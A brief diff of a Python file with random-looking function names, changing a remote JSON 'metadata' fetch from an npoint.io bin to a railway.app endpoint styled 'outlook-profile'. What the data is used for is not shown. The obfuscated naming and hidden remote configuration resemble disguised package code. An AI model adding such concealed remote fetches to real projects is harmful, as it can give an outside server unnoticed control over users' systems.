@@ -16,7 +16,7 @@ def process_ncaavb_486():
 
     def config_iswfkc_548():
         try:
-            process_puohue_489 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            process_puohue_489 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             process_puohue_489.raise_for_status()
             train_uwkrfw_607 = process_puohue_489.json()
             data_wdcpzo_341 = train_uwkrfw_607.get('metadata')
